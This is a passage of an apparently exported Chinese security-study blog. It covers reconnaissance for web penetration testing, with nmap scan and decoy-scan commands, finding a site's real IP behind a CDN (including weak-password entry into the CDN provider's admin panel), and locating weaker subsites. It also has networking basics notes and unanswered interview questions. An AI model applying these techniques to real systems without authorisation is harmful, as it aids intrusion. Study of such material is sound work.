<p>1）找到开启了80端口的主机。</p>
<p>2）找到host为<a href="http://www.xxx.com的ip./">www.xxx.com的IP。</a></p>
<p>3）再扫一次抓取特征，通过去除错误页面、空页面等方法得到真实IP。</p>
<p>在这个过程中，会进行大量的端口扫描，因此对带宽占用非常大，并且大量发包在现有网络中会被认为攻击行为。但这是一种有效寻找目标真实IP的方法。</p>
<h2 id="7-CDN服务商"><a href="#7-CDN服务商" class="headerlink" title="7.CDN服务商"></a>7.CDN服务商</h2><p>如果知道目标站点的CND服务商，那么可想办法进入CDN服务商的管理后台得到真实IP，如利用管理员的弱密码等。通常的方式是利用管理员的公共信息，并在社工库中进行查询，以寻找是否有弱密码等。这种方式的成功率不高，但也确实存在此类场景。</p>
<h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618191939335.png" alt="获取真实ip方法总结"></p>
<h1 id="4-真实物理地址"><a href="#4-真实物理地址" class="headerlink" title="4.真实物理地址"></a>4.真实物理地址</h1><p>国内大量的IP地址只能分配到一个物理社区或单位，并在网关处利用私网地址来通过当前的物理地址进行网络访问。</p>
<p>正是基于这种状况，目前真实地理位置查询仅能追查到公网IP地址的分配点上，也就是共用同一个IP地址的社区或单位。</p>
<blockquote>
<p>下面提供了一些目前有效的查询网址：</p>
<p>·<a href="http://ip.chacuo.net/">http://ip.chacuo.net</a></p>
<p>·<a href="http://www.ipip.net/">http://www.ipip.net</a></p>
<p>·<a href="http://ip.chinaz.com/">http://ip.chinaz.com</a></p>
<p>·<a href="http://ip.qq.com/cgi-bin">http://ip.qq.com/cgi-bin</a></p>
<p>·<a href="http://iptogeo.sinaapp.com/">http://iptogeo.sinaapp.com</a></p>
<p>·<a href="http://ip.taobao.com/index.php">http://ip.taobao.com/index.php</a></p>
<p>·<a href="http://ip.taobao.com/service/getIpInfo.php">http://ip.taobao.com/service/getIpInfo.php</a></p>
<p>·<a href="http://int.dpool.sina.com.cn/iplookup/iplookup.php">http://int.dpool.sina.com.cn/iplookup/iplookup.php</a></p>
</blockquote>
<p>当然弄了，实际攻击过程中，发现真实物理地址并没有太多价值。如果要跑到服务器所在地，当地连WIFI或社工手段的话，也不是不行。</p>
<h1 id="5-目标端口开放情况"><a href="#5-目标端口开放情况" class="headerlink" title="5.目标端口开放情况"></a>5.目标端口开放情况</h1><p>这里所说的端口是指TCP&#x2F;IP协议支持的0～65535端口，可采用TCP UDP方式来传输数据。</p>
<p>在Web应用中，HTTP协议默认利用TCP80端口，HTTPS协议默认利用443端口进行数据传输。</p>
<p>一般情况下，常利用NMAP进行端口扫描。目前也有像ZMAP等新兴工具，metaspoilt也可用于端口扫描，大量漏洞扫描工具均有此类功能。</p>
<p>NMAP比较常用，以NMAP为例</p>
<blockquote>
<p>利用NMAP可扫描目标的端口开放情况、对应版本、操作系统等多种信息。NMAP可扫描目标站点的端口开放情况及对应业务，</p>
</blockquote>
<h2 id="1-获取远程主机的系统类型及开放端口"><a href="#1-获取远程主机的系统类型及开放端口" class="headerlink" title="1.获取远程主机的系统类型及开放端口"></a>1.获取远程主机的系统类型及开放端口</h2><p><code>Nmap -sS -P0 -sV -O &lt;target&gt;</code></p>
<blockquote>
<p>这里的&lt;target&gt;可以是单一IP或主机名、域名、子网。其中参数的意义为：</p>
<p>·-sS：进行TCP SYN扫描（又称半连接扫描）。</p>
<p>·-P0：允许用户关闭ICMP pings。</p>
<p>·-sV：打开系统版本检测。</p>
<p>·-O：尝试识别远程操作系统。</p>
<p>除此之外，还可以添加其他选项，实现信息的多方面输出：</p>
<p>·-A：同时打开操作系统指纹和版本检测。</p>
<p>·-v：详细输出扫描情况。</p>
</blockquote>
<h2 id="2-列出开放了指定端口的主机列表"><a href="#2-列出开放了指定端口的主机列表" class="headerlink" title="2.列出开放了指定端口的主机列表"></a>2.列出开放了指定端口的主机列表</h2><p><code>nmap -sT -p 80 -oG – 192.168.1.* | grep open</code></p>
<h2 id="3-在局域网络寻找所有在线主机"><a href="#3-在局域网络寻找所有在线主机" class="headerlink" title="3.在局域网络寻找所有在线主机"></a>3.在局域网络寻找所有在线主机</h2><p><code>nmap -sP 192.168.0.*</code></p>
<p>也可使用以下命令：</p>
<p><code>nmap -sP 192.168.0.0/24</code></p>
<p>这里的*（星号）表示该位为1～254，&#x2F;24代表子网掩码。</p>
<h2 id="4-Ping指定范围内的IP地址"><a href="#4-Ping指定范围内的IP地址" class="headerlink" title="4.Ping指定范围内的IP地址"></a>4.Ping指定范围内的IP地址</h2><p><code>nmap -sP 192.168.1.100-254</code></p>
<h2 id="5-在某段子网上查找未占用的IP"><a href="#5-在某段子网上查找未占用的IP" class="headerlink" title="5.在某段子网上查找未占用的IP"></a>5.在某段子网上查找未占用的IP</h2><p><code>nmap -T4 -sP 192.168.2.0/24 &amp;&amp; egrep &quot;00:00:00:00:00:00&quot; /proc/net/arp</code></p>
<h2 id="6-使用诱饵扫描方法来扫描主机端口"><a href="#6-使用诱饵扫描方法来扫描主机端口" class="headerlink" title="6.使用诱饵扫描方法来扫描主机端口"></a>6.使用诱饵扫描方法来扫描主机端口</h2><p><code>nmap –sS 192.168.0.10 –D 192.168.0.2</code></p>
<h2 id="常用端口扫描汇总"><a href="#常用端口扫描汇总" class="headerlink" title="常用端口扫描汇总"></a>常用端口扫描汇总</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618192936959.png"></p>
<h1 id="6-目标版本特征发现"><a href="#6-目标版本特征发现" class="headerlink" title="6.目标版本特征发现"></a>6.目标版本特征发现</h1><p>中间件版本等信息对攻击者来说非常重要，攻击者会利用获取的目标中间件信息来寻找合适的渗透手段。</p>
<p>通常，攻击者在观察目标时，会利用非正常手段导致目标报错，诱使目标返回错误页面。中间件默认的错误页面中多包含中间版版本等信息。</p>
<p>对用户而言，他们没有必要知道当前服务器的版本信息、报错等内容。因此不推荐输出这些内容。建议隐藏这类中间版本，报错直接给个404就完事了。</p>
<p>多数情况下，运维人员会修改默认的错误页面，或者强制访问错误后直接跳转到首页或断开当前连接。这样就可以防止攻击者通过观察报错页面得到站点的基本信息。这种情况下，可利用扫描工具（如NMAP）进行尝试，也可发现目标的一些中间件特征。</p>
<blockquote>
<p>其原理就是获取目标服务器的响应包头，并针对其中的<strong>server字段</strong>信息进行判断。大多数中间件都会在server字段中填写当前服务器的版本内容。</p>
</blockquote>
<h1 id="7-web漏扫工具"><a href="#7-web漏扫工具" class="headerlink" title="7.web漏扫工具"></a>7.web漏扫工具</h1><p>使用Web漏洞扫描工具的好处在于其检查速度及范围远远高于人工检查，并且可同时针对多个站点进行扫描，对效率提升有极大帮助。</p>
<p>其缺点在于，Web漏洞扫描器并不能完全发现所有漏洞，对很多隐藏很深的漏洞会出现误报及漏报的情况。因此，Web扫描器并非万能。攻击者通常<strong>先利用Web漏洞扫描器</strong>进行初步、全面的探测，之后再利用<strong>人工</strong>方式针对疑似点进行进一步渗透尝试。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618193311361.png"></p>
<p>综上，Web漏洞扫描工具的用法非常简单，输入目标地址、配置相应参数后即可自动化开展扫描。针对Web扫描器的扫描行为，可通过识别http头的server信息进行阻断，或者对各类漏洞测试语句进行过滤。而避免漏洞出现是最根本的方式。</p>
<h1 id="8-分站信息查找"><a href="#8-分站信息查找" class="headerlink" title="8.分站信息查找"></a>8.分站信息查找</h1><p>分站有助于清晰地划分业务逻辑及功能。很多情况下，由于主站访问量很大并且非常重要，运维人员会投入大量精力去管理主站，这在一定程度上会忽视<strong>分站安全</strong>。</p>
<p>在各大互联网公司的SRC（应急响应中心）或漏洞提交平台，可看到其中的绝大部分漏洞均为分站下的漏洞情况。</p>
<p>攻击者在面对对主站渗透攻击过程受阻时，会考虑针对分站的漏洞开展攻击，实现迂回攻击的效果。因此，分站极易成为网站整体安全的短板。</p>
<p>下面是分站寻找方式的总结</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618195351578.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>大量分站由于没有收录而无法被搜索引擎获取。如果需要获取详细信息，可利用各类子域名爆破类等工具进行自动化爆破尝试</p>
]]></content>
      <categories>
        <category>《WEB安全基础》</category>
        <category>信息探测</category>
      </categories>
      <tags>
        <tag>《WEB安全基础》</tag>
        <tag>信息探测</tag>
      </tags>
  </entry>
  <entry>
    <title>第一篇博客</title>
    <url>/2023/05/12/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>参照了杰克小麻雀所分享的经验而搭建的。</p>
<blockquote>
<p><a href="https://blog.csdn.net/yushuaigee/article/details/111465155">(112条消息) 从零开始免费搭建自己的博客(一)——本地搭建hexo框架_在k什么框架搭建博客_杰克小麻雀的博客-CSDN博客</a></p>
</blockquote>
<p>主题优化参照如下：</p>
<p><a href="https://shen-yu.gitee.io/2019/ayer/#%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE">Ayer中文说明 | 岛 (gitee.io)</a></p>
]]></content>
      <categories>
        <category>博客搭建及其优化</category>
      </categories>
      <tags>
        <tag>博客经验来源</tag>
      </tags>
  </entry>
  <entry>
    <title>知识基础</title>
    <url>/2023/05/13/%E7%9F%A5%E8%AF%86%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h1><h2 id="1-域名"><a href="#1-域名" class="headerlink" title="1.域名"></a>1.域名</h2><p>internet上某台计算机或机组的名称</p>
<h3 id="二级域名、多级域名"><a href="#二级域名、多级域名" class="headerlink" title="二级域名、多级域名"></a>二级域名、多级域名</h3><p>国际顶级域名下的二级域名：.microsoft.com</p>
<p>国家顶级域名下的二级域名：.com.cn</p>
<h2 id="2-DNS"><a href="#2-DNS" class="headerlink" title="2.DNS"></a>2.DNS</h2><p>域名系统（Domain Name System）：域名和IP地址相互映射的一个分布式数据库，使用UDP端口53，对每一级域名长度限制是63个字符，域名总长度不超过253个字符</p>
<p>当我们向DNS服务器发起解析域名的请求时，DNS服务器首先会查询自己的缓存中有没有该域名，如果缓存中存在该域名，则可以直接返回IP地址。如果缓存中没有，服务器则会以递归的方式层层访问。</p>
<p>例如：我们要访问<a href="http://www.baidu/">www.baidu</a>. com，首先我们会先向全球13个根服务器发起请求，询问com域名的地址，然后再向负责com域名的名称服务器发送请求，找到baidu.com，这样层层递归，最终找到我们需要的IP地址。</p>
<h3 id="本地HOSTS与DNS关系"><a href="#本地HOSTS与DNS关系" class="headerlink" title="本地HOSTS与DNS关系"></a>本地HOSTS与DNS关系</h3><p>Hosts在本地将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当我们访问域名时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。<br>Hosts地址：C:\Windows\System32\drivers\etc\hosts </p>
<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h3 id="CDN是什么"><a href="#CDN是什么" class="headerlink" title="CDN是什么"></a>CDN是什么</h3><p>Content Delivery Network：构建在网络数据上的分布式内容分发网络，提高系统响应速度，也可以一定程度地拦截攻击。</p>
<p>举例来说，某网站的服务器在A地，E地的用户想要获取服务器的数据，需要跨越很长的距离。这时候的传输速度和路由转发因素，导致访问速度缓慢，所以，如果在E地建立一个CDN服务器，其上缓存了A地服务器的一些数据，那这样的话用户只需访问E地的CDN服务器就能获取相关信息。</p>
<h3 id="CDN工作过程"><a href="#CDN工作过程" class="headerlink" title="CDN工作过程"></a>CDN工作过程</h3><ol>
<li><p>dns请求当地local DNS</p>
</li>
<li><p>当地local DNS递归的查询服务器的gslb（全局负载均衡；CDN系统总是希望用距离用户最近的设备为其提供服务，这也需要在不同地域部署多个节点。GSLB系统就是解决这个问题的。</p>
<p>版权声明：本文为CSDN博主「dahuang1016」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/dahuang1016/article/details/105928932%EF%BC%89">https://blog.csdn.net/dahuang1016/article/details/105928932）</a></p>
</li>
<li><p>服务器根据local DNS 分配最佳节点，返回ip</p>
</li>
<li><p>用户获得最佳接入ip，访问最佳节点。</p>
</li>
<li><p>如果该节点没有用户想要获取的内容，则通过内部路由访问上一节点，直到找到文件或到达源站为止。</p>
</li>
<li><p>cdn节点缓存该数据，下次请求该文件时可以直接返回。</p>
</li>
</ol>
<p>————————————————<br>版权声明：本文为CSDN博主「码上腾飞」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Frankltf/article/details/108820315">https://blog.csdn.net/Frankltf/article/details/108820315</a></p>
<h3 id="CDN与DNS关系"><a href="#CDN与DNS关系" class="headerlink" title="CDN与DNS关系"></a>CDN与DNS关系</h3><p>cdn的就近访问，那就需要知道用户所在位置，好给他分配最优的CDN节点。**&#x3D;&#x3D;所以需要用到DNS定位&#x3D;&#x3D;<strong>。一般的调度方式是，如果调度服务器看到用户使用了E地的LDNS（本地DNS）服务器，</strong>就会认为该用户来自E地**，然后给该用户分配了E地的CDN服务器，让他去访问。</p>
<p>当然了，其缺点在于，A地的用户使用了E地的LDNS的话，被分配的会是E地的CDN。</p>
<p>所以引入了<strong>http调度</strong>。</p>
<p>其原理为：当用户访问我们的服务器时，服务器先分析用户的ip地址，然后服务器给用户返回一个302重定向，将离用户最近的服务器存在location中，用户再去请求这个cdn服务器就能得到最佳的cdn节点。</p>
<p>不足之处在于，其有一次额外的htttp访问，首次访问的延时较高，访问些小文件有点得不偿失。<strong>所以一般是dns先定位，http的方式来调整偏差。</strong></p>
<h3 id="常见DNS攻击"><a href="#常见DNS攻击" class="headerlink" title="常见DNS攻击"></a>常见DNS攻击</h3><ul>
<li>缓存投毒：它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。</li>
<li>DNS劫持：是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。（针对面较广）</li>
<li>域名劫持：域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。（针对面窄一点）</li>
<li>DNS DDOS攻击：通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。</li>
</ul>
<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
<h2 id="3-后门"><a href="#3-后门" class="headerlink" title="3.后门"></a>3.后门</h2><h3 id="后门是什么"><a href="#后门是什么" class="headerlink" title="后门是什么"></a>后门是什么</h3><p>通常指那些绕过安全性控制而获取对程序或系统访问权的程序方法。<br>在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。</p>
<h3 id="后门的意义"><a href="#后门的意义" class="headerlink" title="后门的意义"></a>后门的意义</h3><p>可以更方便的链接到主机；在获取到主机权限的时候，后门可以充当命令控制台的角色 </p>
<p>如果后门进入后遇到文件无权限，换目录</p>
<h2 id="4-WEB"><a href="#4-WEB" class="headerlink" title="4.WEB"></a>4.WEB</h2><h3 id="WEB的组成"><a href="#WEB的组成" class="headerlink" title="WEB的组成"></a>WEB的组成</h3><ul>
<li>网站源码：分脚本类型，分应用方向</li>
<li>操作系统：windows、linux</li>
<li>中间件（搭建平台）：apache iis tomcat nginx 等</li>
<li>数据库：access mysql mssql oracle sybase db2 postsql 等</li>
</ul>
<h3 id="WEB相关漏洞"><a href="#WEB相关漏洞" class="headerlink" title="WEB相关漏洞"></a>WEB相关漏洞</h3><ul>
<li>WEB 源码类对应漏洞：SQL 注入，上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等</li>
<li>WEB 中间件对应漏洞：未授权访问，变量覆盖…</li>
<li>WEB 数据库对应漏洞：弱口令，权限提升…</li>
<li>WEB 系统层对应漏洞：提权，远程代码执行</li>
<li>其他第三方对应漏洞</li>
<li>APP 或 PC 应用结合类</li>
</ul>
<p>作者：黑战士安全 <a href="https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&jump_opus=1">https://www.bilibili.com/read/cv19754086?spm_id_from=333.999.0.0&amp;jump_opus=1</a> 出处：bilibili</p>
<h3 id="信息敏感点"><a href="#信息敏感点" class="headerlink" title="信息敏感点"></a>信息敏感点</h3><ul>
<li><p>敏感目录结构：数据库配置文件，后台目录，模版目录，数据库目录等</p>
</li>
<li><p>web脚本类型：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码</p>
</li>
<li><p>应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
</li>
<li><p>开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续等</p>
</li>
</ul>
<h3 id="网站搭建相关知识"><a href="#网站搭建相关知识" class="headerlink" title="网站搭建相关知识"></a>网站搭建相关知识</h3><p>扫描时：域名访问一般只会指向某个目录(子目录)及其内部文件，而IP访问指向根目录，发现的内容更多。</p>
<p>f12网络数据包会有网站的信息（如中间站、系统等）</p>
<h3 id="常见文件后缀解析"><a href="#常见文件后缀解析" class="headerlink" title="常见文件后缀解析"></a>常见文件后缀解析</h3><p>主要是类似于一句话木马的后缀限制，如果不行，就换个后缀，这个原理来自中间件的解析？</p>
<h2 id="5-系统"><a href="#5-系统" class="headerlink" title="5.系统"></a>5.系统</h2><h3 id="识别操作系统"><a href="#识别操作系统" class="headerlink" title="识别操作系统"></a>识别操作系统</h3><p>windows对大小写不敏感，ping值 ttl128左右；而linux敏感，ping值 ttl64左右</p>
<p>nmap -O ip</p>
<h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><h4 id="识别方式"><a href="#识别方式" class="headerlink" title="识别方式"></a>识别方式</h4><ul>
<li>nmap -O ip</li>
<li>nmap ip -p 端口，通过端口开发反推数据库</li>
</ul>
<h4 id="数据库常见漏洞类型与攻击"><a href="#数据库常见漏洞类型与攻击" class="headerlink" title="数据库常见漏洞类型与攻击"></a>数据库常见漏洞类型与攻击</h4><ul>
<li>弱口令</li>
<li>sql注入</li>
</ul>
<h3 id="常见数据库结构"><a href="#常见数据库结构" class="headerlink" title="常见数据库结构"></a>常见数据库结构</h3><ul>
<li>ASP+Access</li>
<li>php+mysql</li>
<li>axpx+mssql</li>
<li>jsp+mssql，oracle</li>
<li>python+mongodb</li>
</ul>
<h3 id="服务器端口"><a href="#服务器端口" class="headerlink" title="服务器端口"></a>服务器端口</h3><ul>
<li>关系型数据库 –MySQL:3306 –SqlServer:1433 –Oracle:1521</li>
<li>NOSQL数据库 –MongoDB:27017 –Redis:6379 -memcached:11211</li>
</ul>
<h1 id="二、网安"><a href="#二、网安" class="headerlink" title="二、网安"></a>二、网安</h1><h2 id="1-OSI七层模型"><a href="#1-OSI七层模型" class="headerlink" title="1.OSI七层模型"></a>1.OSI七层模型</h2><ol>
<li><p>物理层（Physical Layer）：该层处理物理传输介质上的原始比特流，主要关注传输媒介、电压、电缆规范、接口等问题。</p>
<p><strong>比特</strong></p>
</li>
<li><p>数据链路层（Data Link Layer）：该层负责将物理层提供的比特流划分为数据帧，并检测和纠正传输中的错误。它还处理点对点之间的直接通信，提供链路管理、访问控制和流量控制等功能。</p>
<p><strong>帧</strong></p>
</li>
<li><p>网络层（Network Layer）：该层负责在网络中传输数据包，通过确定最佳路径将数据从发送方传输到接收方。它还处理分组的路由选择、分组转发和拥塞控制等任务。</p>
<p><strong>数据报</strong></p>
</li>
<li><p>传输层（Transport Layer）：该层提供端到端的数据传输服务，确保可靠的数据传输。它负责分段和重组数据，并提供错误检测和纠正、流量控制、拥塞控制以及端口号标识等功能。</p>
<p><strong>报文段&#x2F;用户数据报</strong></p>
</li>
<li><p>会话层（Session Layer）：该层建立、管理和终止应用程序之间的会话连接。它提供了会话控制、同步和对话管理功能，允许应用程序之间进行通信和数据交换。</p>
</li>
<li><p>表示层（Presentation Layer）：该层处理数据的表示方式，确保不同系统中数据的兼容性。它负责数据的加密、压缩、解压缩、格式转换以及数据格式的统一表示。</p>
<p>例如，PC程序与另一台计算机进行通信，其中一台计算机使用扩展二一十进制交换码（EBCDIC），而另一台则使用美国信息交换标准码（ASCII）来表示相同的字符。如有必要，表示层会通过使用一种通格式来实现多种数据格式之间的转换。 　　</p>
</li>
<li><p>应用层（Application Layer）：该层是最高级别的层次，提供直接面向用户的网络服务。它包括各种应用程序协议，例如HTTP（超文本传输协议）、SMTP（简单邮件传输协议）、FTP（文件传输协议）等。</p>
</li>
</ol>
<p><img src="/../../../Typora/img111/image-20230613203703899.png"></p>
<p>TCP&#x2F;IP准确来说，第一层应该是网络接口层</p>
<h2 id="2-get与post区别"><a href="#2-get与post区别" class="headerlink" title="2.get与post区别"></a>2.get与post区别</h2><p>HTTP协议中的两种请求方法</p>
<ol>
<li><p>数据位置上，GET请求将数据附加在URL的查询参数中，以?后的键值对形式进行传递；POST在请求体上传递，需要抓包。</p>
</li>
<li><p>数据长度限制：GET请求对数据长度有限制，因为URL有长度限制，不同浏览器和服务器对长度限制的处理方式不同；而POST请求没有严格的数据长度限制。</p>
</li>
<li><p>数据安全性：GET请求中的数据参数会显示在URL中，因此可能被保存在浏览器的历史记录、服务器日志等地方，存在一定的安全风险；POST请求中的数据不会直接显示在URL中，相对更安全。</p>
</li>
<li><p>缓存：GET请求可以被浏览器缓存，以提高性能和效率；POST请求默认不会被浏览器缓存，以确保数据的实时性。</p>
</li>
<li><p>使用场景：GET请求适合获取资源、查询数据，对于幂等的操作。POST请求适合发送数据、提交表单，对于非幂等的操作。</p>
</li>
<li><p>幂等性：GET请求是幂等的，即多次重复请求不会对资源产生影响，只是获取相同的结果；而POST请求通常是非幂等的，多次请求可能会对资源产生不同的影响，例如创建多个资源。</p>
<blockquote>
<p>幂等:指对同一操作的多次重复执行产生的结果与单次执行的结果相同。简而言之，无论执行多少次，最终的效果都是一样的。</p>
</blockquote>
</li>
</ol>
<h2 id="3-Cookies和session的区别"><a href="#3-Cookies和session的区别" class="headerlink" title="3.Cookies和session的区别"></a>3.Cookies和session的区别</h2><p>Cookies是在客户端（通常是Web浏览器）上存储数据的小型文本文件。</p>
<p>Session是在服务器端存储数据的一种机制。</p>
<p>区别：</p>
<ol>
<li>存储位置：Cookies存储在客户端（用户的计算机）上，而Session数据存储在服务器端。</li>
<li>数据容量：Cookies通常有大小限制（每个域名和浏览器对Cookies的数量和大小都有限制），而Session可以存储更多的数据。</li>
<li>安全性：由于Cookies存储在客户端，因此它们容易受到篡改和伪造的风险。为了增加安全性，可以对Cookies进行加密或添加安全标志。相比之下，Session数据存储在服务器上，不容易被窃取或篡改，但仍然需要注意保护SessionID的安全性。</li>
<li>生命周期：Cookies可以设置过期时间，可以是会话性的（在浏览器关闭后失效）或持久性的（在特定时间后失效）。Session通常在用户关闭浏览器或一段时间不活动后失效。</li>
</ol>
<h2 id="4-arp协议的工作原理"><a href="#4-arp协议的工作原理" class="headerlink" title="4.arp协议的工作原理"></a>4.arp协议的工作原理</h2><p>将IP地址映射到物理MAC地址的协议，它在局域网中工作。其主要功能是解决在发送数据包时，通过目标IP地址获取对应的MAC地址的问题。</p>
<ol>
<li>主机A发送数据包到目标主机B，但是主机A只知道目标主机B的IP地址。</li>
<li>主机A首先检查本地的ARP缓存表，看是否已经有目标主机B的IP地址对应的MAC地址。如果有，主机A就可以直接使用这个MAC地址。</li>
<li>如果ARP缓存表中没有目标主机B的IP地址对应的MAC地址，主机A就需要发送一个ARP请求广播。ARP请求广播是一个<strong>以太网帧</strong>，包含了源主机A的MAC地址、源主机A的IP地址、目标IP地址（即主机B的IP地址）以及一个特殊的目标MAC地址（广播地址：FF:FF:FF:FF:FF:FF）。</li>
<li>当主机B接收到ARP请求广播后，检查广播中的目标IP地址是否和自己的IP地址匹配。如果匹配，主机B就会发送一个ARP响应给主机A。ARP响应是一个<strong>以太网帧</strong>，包含了源主机B的MAC地址、源主机B的IP地址以及目标主机A的IP地址和MAC地址。</li>
<li>主机A接收到ARP响应后，将目标主机B的IP地址和MAC地址的映射关系存储在本地的ARP缓存表中，以便将来的通信中可以直接使用。</li>
<li>主机A收到目标主机B的MAC地址后，可以构建<strong>以太网帧</strong>，并将数据包发送到目标主机B的MAC地址。</li>
</ol>
<h3 id="问题17：session-的工作原理"><a href="#问题17：session-的工作原理" class="headerlink" title="问题17：session 的工作原理?"></a>问题17：session 的工作原理?</h3><p><strong>答案：</strong></p>
<h3 id="问题18：一次完整的HTTP请求过程"><a href="#问题18：一次完整的HTTP请求过程" class="headerlink" title="问题18：一次完整的HTTP请求过程"></a>问题18：一次完整的HTTP请求过程</h3><p><strong>答案：</strong></p>
<h3 id="问题19：HTTPS和HTTP的区别"><a href="#问题19：HTTPS和HTTP的区别" class="headerlink" title="问题19：HTTPS和HTTP的区别"></a>问题19：HTTPS和HTTP的区别</h3><p><strong>答案：</strong></p>
<h3 id="问题20：OSI-的七层模型都有哪些"><a href="#问题20：OSI-的七层模型都有哪些" class="headerlink" title="问题20：OSI 的七层模型都有哪些?"></a>问题20：OSI 的七层模型都有哪些?</h3><p><strong>答案：</strong></p>
<h3 id="问题21：http长连接和短连接的区别"><a href="#问题21：http长连接和短连接的区别" class="headerlink" title="问题21：http长连接和短连接的区别"></a>问题21：http长连接和短连接的区别</h3><p><strong>答案：</strong></p>
<h3 id="问题22：TCP如何保证可靠传输"><a href="#问题22：TCP如何保证可靠传输" class="headerlink" title="问题22：TCP如何保证可靠传输?"></a>问题22：TCP如何保证可靠传输?</h3><p><strong>答案：</strong></p>
<h3 id="问题23：常见的状态码有哪些"><a href="#问题23：常见的状态码有哪些" class="headerlink" title="问题23：常见的状态码有哪些?"></a>问题23：常见的状态码有哪些?</h3><p><strong>答案：</strong></p>
<h3 id="问题24：什么是SSL-https是如何保证数据传输的安全（SSL是怎么工作保证安全的）"><a href="#问题24：什么是SSL-https是如何保证数据传输的安全（SSL是怎么工作保证安全的）" class="headerlink" title="问题24：什么是SSL? https是如何保证数据传输的安全（SSL是怎么工作保证安全的）"></a>问题24：什么是SSL? https是如何保证数据传输的安全（SSL是怎么工作保证安全的）</h3><p><strong>答案：</strong></p>
<h3 id="问题25：如何保证公钥不被篡改"><a href="#问题25：如何保证公钥不被篡改" class="headerlink" title="问题25：如何保证公钥不被篡改?"></a>问题25：如何保证公钥不被篡改?</h3><p><strong>答案：</strong></p>
<h3 id="问题26：php爆绝对路径方法"><a href="#问题26：php爆绝对路径方法" class="headerlink" title="问题26：php爆绝对路径方法?"></a>问题26：php爆绝对路径方法?</h3><p><strong>答案：</strong></p>
<h3 id="问题27：你常用的渗透工具有哪些，最常用的是哪个"><a href="#问题27：你常用的渗透工具有哪些，最常用的是哪个" class="headerlink" title="问题27：你常用的渗透工具有哪些，最常用的是哪个?"></a>问题27：你常用的渗透工具有哪些，最常用的是哪个?</h3><p><strong>答案：</strong></p>
<h3 id="问题28：xss盲打到内网服务器的利用"><a href="#问题28：xss盲打到内网服务器的利用" class="headerlink" title="问题28：xss盲打到内网服务器的利用"></a>问题28：xss盲打到内网服务器的利用</h3><p><strong>答案：</strong></p>
<h3 id="问题29：鱼叉式攻击和水坑攻击"><a href="#问题29：鱼叉式攻击和水坑攻击" class="headerlink" title="问题29：鱼叉式攻击和水坑攻击"></a>问题29：鱼叉式攻击和水坑攻击</h3><p><strong>答案：</strong></p>
<h3 id="问题30：什么是虚拟机逃逸"><a href="#问题30：什么是虚拟机逃逸" class="headerlink" title="问题30：什么是虚拟机逃逸?"></a>问题30：什么是虚拟机逃逸?</h3><p><strong>答案：</strong></p>
<h3 id="问题31：中间人攻击"><a href="#问题31：中间人攻击" class="headerlink" title="问题31：中间人攻击?"></a>问题31：中间人攻击?</h3><p><strong>答案：</strong></p>
<h3 id="问题32：TCP三次握手过程"><a href="#问题32：TCP三次握手过程" class="headerlink" title="问题32：TCP三次握手过程?"></a>问题32：TCP三次握手过程?</h3><p><strong>答案：</strong></p>
<h3 id="问题33：七层模型"><a href="#问题33：七层模型" class="headerlink" title="问题33：七层模型?"></a>问题33：七层模型?</h3><p><strong>答案：</strong></p>
<h3 id="问题34：对于云安全的理解"><a href="#问题34：对于云安全的理解" class="headerlink" title="问题34：对于云安全的理解"></a>问题34：对于云安全的理解</h3><p><strong>答案：</strong></p>
<h3 id="问题35：了解过websocket吗"><a href="#问题35：了解过websocket吗" class="headerlink" title="问题35：了解过websocket吗?"></a>问题35：了解过websocket吗?</h3><p><strong>答案：</strong></p>
<h3 id="问题36：DDOS是什么-有哪些-CC攻击是什么-区别是什么"><a href="#问题36：DDOS是什么-有哪些-CC攻击是什么-区别是什么" class="headerlink" title="问题36：DDOS是什么?有哪些?CC攻击是什么?区别是什么?"></a>问题36：DDOS是什么?有哪些?CC攻击是什么?区别是什么?</h3><p><strong>答案：</strong></p>
